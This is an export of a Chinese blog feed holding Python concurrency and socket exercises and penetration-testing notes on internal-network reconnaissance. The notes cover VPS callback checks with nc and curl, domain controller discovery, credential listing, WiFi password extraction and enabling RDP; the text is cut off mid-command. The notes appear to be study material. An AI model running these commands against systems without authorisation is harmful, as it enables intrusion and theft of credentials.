class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><blockquote><p>消耗的时间为 ：2.4721951484680176</p><p>消耗的时间为 ：2.4349334239959717</p><p>消耗时间为:4.907128572463989</p></blockquote><p><strong>使用多进程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><span class="hljs-comment"># 使用多进程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work_out</span>():<br>    start = time()<br>    <span class="hljs-built_in">all</span> = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>):<br>        <span class="hljs-built_in">all</span> = <span class="hljs-built_in">all</span> * i<br>        <span class="hljs-comment"># print(all)</span><br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗的时间为 ：<span class="hljs-subst">&#123;end-start&#125;</span>\n&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    p1 = Process(target=work_out)<br>    p1.start()<br>    p2 = Process(target=work_out)<br>    p2.start()<br>    p1.join()<br>    p2.join()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗时间为:<span class="hljs-subst">&#123;end-start&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><blockquote><p>消耗的时间为 ：3.135038137435913</p><p>消耗的时间为 ：3.1490530967712402</p><p>消耗时间为:3.279216766357422</p></blockquote></li><li><p>也可以使用subprocess模块中类</p><p>创建子进程，然后子进程之间可以访问</p></li></ol><p>我不知道怎么解释，看着有问题问我就行</p></li></ul><h1 id="23-10-30"><a href="#23-10-30" class="headerlink" title="23_10_30"></a>23_10_30</h1><p>赶着最后一天，给你分享点东西</p><p>反正要上python课你可以结合起来看看，或者到最后一起看</p><ul><li><p><input disabled="" type="checkbox"> python的网络编程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Download</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.__url = url<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        fileName = self.__url[self.__url.rfind(<span class="hljs-string">&#x27;/&#x27;</span>)+<span class="hljs-number">1</span>:] <span class="hljs-comment"># 获取文件名，从左一个/开始后面的</span><br>        resp = requests.get(self.__url)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(fileName, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(resp.content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    Download(<span class="hljs-string">r&quot;自己的&quot;</span>).start() <span class="hljs-comment">#! 我本来放了我的图床的，但是你是学web的，我怕被你发现了什么神奇的东西哈哈哈</span><br><br><br>main()<br></code></pre></td></tr></table></figure></li></ul><h1 id="23-11-2"><a href="#23-11-2" class="headerlink" title="23_11_2"></a>23_11_2</h1><p>上课弄得</p><p>我们尝试使用tcp&#x2F;ip</p><p>我下面放两段代码，我试了可以运行，但是课上做的，代码逻辑，代码结构，优化啊可能不是很完美</p><p>server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> http <span class="hljs-keyword">import</span> server<br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> socket,SOCK_STREAM,AF_INET<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> add<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.server=socket(family=AF_INET,<span class="hljs-built_in">type</span>=SOCK_STREAM)<br>        self.server.bind((<span class="hljs-string">&#x27;192.168.211.195&#x27;</span>,<span class="hljs-number">35555</span>))<br>        self.server.listen(<span class="hljs-number">512</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;begin.....&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">server_connet</span>(<span class="hljs-params">self</span>):<br>        num=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client,addr=self.server.accept()<br>            num+=<span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;现在有<span class="hljs-subst">&#123;num&#125;</span>个client&quot;</span>)<br>            Thread(target=self.client_session,args=(client,addr))<br>         <br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">client_session</span>(<span class="hljs-params">self,client: socket,addr</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;addr&#125;</span>  连接到服务器&quot;</span>)<br>        recv_message=client.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;client<span class="hljs-subst">&#123;client&#125;</span> time :<span class="hljs-subst">&#123;datetime.now()&#125;</span> 发来一条信息:<span class="hljs-subst">&#123;recv_message&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    server=Server()<br>    server.server_connet()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br>    <br>   <br></code></pre></td></tr></table></figure><p>client.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> socket,SOCK_STREAM,AF_INET<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">client</span>():<br>    client=socket()<br>    client.connect((<span class="hljs-string">&quot;192.168.211.195&quot;</span>,<span class="hljs-number">35555</span>))<br>    send_message=<span class="hljs-string">f&quot;august nihao!&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    client.send(send_message)<br>    client.close()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">50</span>): <span class="hljs-comment"># 创建50个我想证明多并发，但是这样有点不合理，想想怎么优化，没想到的话问问我吧</span><br>    client()<br>    sleep(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB安全</title>
    <link href="/2023/09/21/web/WEB%E5%AE%89%E5%85%A8/"/>
    <url>/2023/09/21/web/WEB%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集</title>
    <link href="/2023/09/12/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2023/09/12/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="内网环境分析"><a href="#内网环境分析" class="headerlink" title="内网环境分析"></a>内网环境分析</h1><h2 id="什么是内网渗透"><a href="#什么是内网渗透" class="headerlink" title="什么是内网渗透"></a>什么是内网渗透</h2><ol><li>内网渗透的第一步，内网信息收集</li></ol><h2 id="内网外网的简介"><a href="#内网外网的简介" class="headerlink" title="内网外网的简介"></a>内网外网的简介</h2><ol><li><p>内网又称局域网</p></li><li><p>外网又称为广域网</p></li><li><p>内外网的区别</p><ul><li><p>内网和外网的覆盖范围不一样，内网通常是一个学校、一个医院的网络，外网通常指Internet网</p></li><li><p>内网一般是用于局域网内部的计算机之间的互相通信，如果需要访问Internet，需要借助外网，一般可以使用<strong>NAT</strong>技术实现内网访问外网</p></li><li><p>内网地址是私有地址和外网的不同</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83/image-20230912203818546.png" alt="image-20230912203818546"></p></li></ul></li></ol><h2 id="windows域环境"><a href="#windows域环境" class="headerlink" title="windows域环境"></a>windows域环境</h2><ol><li><p>域环境简介</p><p>域是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源）；域内资源由一台域控制 器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。  </p><p><strong>渗透的目标就是拿到域控制器</strong></p></li><li><p>安全域划分</p><p>DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一  些必须公开的服务器设施  </p><p>拥有DMZ区的访问规则</p><ul><li>内网可以访问外网</li><li>外网不能访问内网</li><li>外网可以访问DMZ区</li><li>内网可以访问DMZ</li><li>DMZ不能访问内网</li><li>DMZ不能访问外网</li></ul><p>上面只是通常的做法，具体的还是得看具体的规则怎么实现</p><blockquote><p>一般如果拿下了DMZ区，可以尝试访问其他地区</p></blockquote></li><li><p>与渗透的思路</p><ul><li>通过域成员得到域控的IP</li><li>通过域成员作为跳板扩大范围</li><li>利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP  </li><li>设法从域成员主机内存中dump出域管理员密码</li></ul></li><li><p>域渗透的目标</p><p>就是拿到域控，因为域控沦陷了，内网就基本可以说掌握中了</p></li><li><p>连通性判断</p><p>tcp 协议：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vps</span>：nc -lvvp <span class="hljs-number">8888</span><br><span class="hljs-attribute">target</span>：nc vps-ip <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>DNS协议:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vps：nc -u -lvp <span class="hljs-number">53</span><br>target：<br>nslookup www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> vps-ip<br>dig @vsp-ip www<span class="hljs-selector-class">.baidu</span>.com<br></code></pre></td></tr></table></figure><p>HTTP:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vps</span>：nc -lvvp <span class="hljs-number">80</span><br><span class="hljs-attribute">target</span>：curl vps-ip <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>ICMP:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">vps：tcpdump <span class="hljs-keyword">icmp</span><br><span class="hljs-keyword">target</span>：ping vps-ip<br></code></pre></td></tr></table></figure></li><li><p>针对一个winserver 安装ad 的时候，原本的administrator 会自动提升到域管理员，密码和原来的一致</p></li></ol><h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="工作组信息收集"><a href="#工作组信息收集" class="headerlink" title="工作组信息收集"></a>工作组信息收集</h2><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><ol><li><p>查看本机用户目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net user [name]<br></code></pre></td></tr></table></figure></li><li><p>获取本地管理员信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup administrators<br></code></pre></td></tr></table></figure></li><li><p>获取当前在线用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell;">quser user/[name]<br>query user || qwinsta<br></code></pre></td></tr></table></figure></li><li><p>查看当前用户的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami /all<br></code></pre></td></tr></table></figure></li><li><p>查看当前的权限</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">whoami &amp;&amp; whoami /priv<br></code></pre></td></tr></table></figure></li><li><p>查看当前机器中的所有组名，了解不同的只能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net localgroup<br></code></pre></td></tr></table></figure></li></ol><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ol><li><p>查询网络信息，网络地址段信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ipconfig /all  <br></code></pre></td></tr></table></figure></li><li><p>查询操作信息及软件信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systeminfo /fo  list  <br></code></pre></td></tr></table></figure></li><li><p>查看当前系统版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sehll">wmic os list  brief<br></code></pre></td></tr></table></figure></li><li><p>查询本机服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic service list brief  <br></code></pre></td></tr></table></figure></li><li><p>查看安装的软件版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wmic product get name, version<br></code></pre></td></tr></table></figure></li><li><p>进程信息</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">tasklist</span><br></code></pre></td></tr></table></figure></li><li><p>查看驱动信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">wmic startup <span class="hljs-built_in">get</span> *<span class="hljs-number">*c</span>ommand**,caption<br></code></pre></td></tr></table></figure></li><li><p>查看本地可用凭据</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">cmdkey <span class="hljs-string">\l</span><br></code></pre></td></tr></table></figure></li><li><p>查看本地密码策略</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> accounts<br></code></pre></td></tr></table></figure></li><li><p>查看dns缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ipconfig /displaydns<br></code></pre></td></tr></table></figure></li><li><p>hosts 文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">c</span>:\Windows\system32\drivers\etc\hosts<br>\etc\hosts<br></code></pre></td></tr></table></figure></li></ol><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><ol><li><p>查看端口和pid</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -ano<br>netstat -anob <span class="hljs-comment"># 需要管理员，这个命令可以查询所有端口发起的应用程序</span><br></code></pre></td></tr></table></figure></li><li><p>查看路由表和<em>arp</em>缓存</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">route <span class="hljs-built_in">print</span><br>arp -a<br></code></pre></td></tr></table></figure></li><li><p>查看共享列表</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> share<br></code></pre></td></tr></table></figure></li><li><p>磁盘映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">net use k: \\192.168.1.10\c$<br></code></pre></td></tr></table></figure></li></ol><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><ol><li><p>查看防火墙配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netsh firewall show config<br></code></pre></td></tr></table></figure></li></ol><h3 id="RDP桌面"><a href="#RDP桌面" class="headerlink" title="RDP桌面"></a>RDP桌面</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#开启</span><br>wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-built_in">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br><span class="hljs-meta">#关闭</span><br>wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> <span class="hljs-built_in">call</span> SetAllowTSConnections <span class="hljs-number">0</span><br><span class="hljs-meta">#查询并开启RDP服务的端口，返回一个十六进制的端口</span><br>REG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNum<br>ber<br><br></code></pre></td></tr></table></figure><h3 id="获取杀软信息"><a href="#获取杀软信息" class="headerlink" title="获取杀软信息"></a>获取杀软信息</h3><ol><li><p>获取杀软名</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">WMIC</span> <span class="hljs-operator">/</span><span class="hljs-variable">Namespace</span><span class="hljs-operator">:</span>\\<span class="hljs-variable">root</span>\<span class="hljs-variable">SecurityCenter2</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">AntiVirusProduct</span> <span class="hljs-built_in">Get</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">/</span><span class="hljs-built_in">Format</span><span class="hljs-operator">:</span><span class="hljs-built_in">List</span><br></code></pre></td></tr></table></figure></li><li><p>获取杀软名和安装路径</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">WMIC</span> <span class="hljs-operator">/</span><span class="hljs-variable">Namespace</span><span class="hljs-operator">:</span>\\<span class="hljs-variable">root</span>\<span class="hljs-variable">SecurityCenter2</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">AntiVirusProduct</span> <span class="hljs-built_in">Get</span> <span class="hljs-variable">displayName</span><span class="hljs-operator">,</span><span class="hljs-variable">productState</span><span class="hljs-operator">,</span><span class="hljs-variable">pathToSignedProductExe</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="WIFE密码"><a href="#WIFE密码" class="headerlink" title="WIFE密码"></a>WIFE密码</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh wlan show<span class="hljs-built_in"> profile </span># 用于查询当前主机连接过的wifi名<br>netsh wlan show<span class="hljs-built_in"> profile </span><span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;wifi_name&quot;</span> <span class="hljs-attribute">key</span>=clear # 查询密码<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109154756081.png" alt="image-20240109154756081"></p><h3 id="powershell信息收集"><a href="#powershell信息收集" class="headerlink" title="powershell信息收集"></a>powershell信息收集</h3><p>通过powershell语法执行ps文件</p><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><h3 id="net组件"><a href="#net组件" class="headerlink" title="net组件"></a>net组件</h3><ol><li><p>查询当前域</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure><p>但是这个需要将域控的防火墙关闭</p></li><li><p>查询域内所有主机</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span>:august<br></code></pre></td></tr></table></figure></li><li><p>查询域内所有用户组</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure></li><li><p>查询域成员计算机列表</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure></li><li><p>查询系统管理员用户组</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Enterprise</span> admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure></li><li><p>查看域控制器</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure></li><li><p>查看域内所有账号</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure></li><li><p>查询指定用户详情信息</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> /domain<br></code></pre></td></tr></table></figure></li><li><p>通过找时间查询域控</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure></li><li><p>登录本机的域管理员</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net localgroup administrators /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="Dsquery"><a href="#Dsquery" class="headerlink" title="Dsquery"></a>Dsquery</h3><p>这个工具只有域控才有，可以自己上传一个</p><ol><li><p>查看域内的所有的机器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dsquery computer</span><br></code></pre></td></tr></table></figure></li><li><p>查看当前域内的所有的用户名</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><ol><li><p>域控制器的机器名</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">nltest /<span class="hljs-variable constant_">DCLIST</span><span class="hljs-symbol">:MINGY</span><br></code></pre></td></tr></table></figure></li><li><p>查看域内的主机名</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netdom query pdc</span><br></code></pre></td></tr></table></figure></li><li><p>查看域控的主机名</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=srv <span class="hljs-variable">_ldap</span>.<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure><p>这个指令可以获取域控的Ip</p></li><li><p>查看域内DNS服务器</p></li></ol>   <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nslookup <span class="hljs-attribute">-q</span>=ns mingy.com<br></code></pre></td></tr></table></figure><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ipconfig /<span class="hljs-keyword">all</span><br>nslookup -<span class="hljs-keyword">type</span>=<span class="hljs-keyword">all</span> _ldap._tcp.dc._msdcs.mingy.com<br>setspn -q *<span class="hljs-comment">/*</span><br><span class="hljs-comment">setspn -T mingy.com -q */</span>*<br>net <span class="hljs-keyword">group</span> &quot;domain controllers&quot; /<span 